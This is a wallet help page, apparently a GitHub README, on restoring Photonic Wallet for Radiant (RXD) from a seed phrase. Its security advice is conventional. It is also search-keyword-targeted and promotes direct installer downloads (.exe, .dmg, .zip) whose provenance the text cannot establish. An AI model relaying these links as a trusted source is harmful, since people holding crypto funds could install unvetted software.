<div align="center">

<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Restore Photonic Wallet from a seed phrase

[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Install the current Photonic desktop release, choose Restore, type your 12 words in order, and let the wallet scan your addresses.

---

## You'll see this if

- You reinstalled your computer
- You moved to a new laptop
- Your old wallet app no longer opens

## Why it happens

Your coins live on the Radiant chain, not in the app. The seed phrase rebuilds the keys that control them. More background lives in our guide on [recover missing addresses after a restore](recover-missing-addresses-after-restore.md) and on the [restore guide on photonicwallet.org](https://photonicwallet.org/guides/restore-wallet).

## Fix it step by step

1. Download the latest installer from the tagged release.
2. Open Photonic and pick Restore wallet.
3. Enter all 12 words in the original order and set a new local password.
4. Wait for the address scan to finish before judging the balance.

## If that didn't work

Check every word against the BIP-39 list; one typo produces a different, empty wallet. The [Photonic security model](https://photonicwallet.org/security) covers related cases, and [Radiant (RXD) derivation paths explained](radiant-rxd-derivation-path-explained.md) may match your situation.

## Prevention

Write the phrase on paper, store two copies in separate places, never photograph it.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Do I need my old password?</b></summary>

No. The password only encrypts the local file; the seed phrase is what restores funds.

</details>

<details>
<summary><b>Is restoring safe online?</b></summary>

Only inside the installed desktop app. Never type the phrase into a website or chat.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Recover missing addresses after a restore](recover-missing-addresses-after-restore.md) | Photonic Wallet guide |
| [Radiant (RXD) derivation paths explained](radiant-rxd-derivation-path-explained.md) | Photonic Wallet guide |
| [Seed phrase not accepted by Photonic](photonic-wallet-seed-phrase-not-accepted.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet restore · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
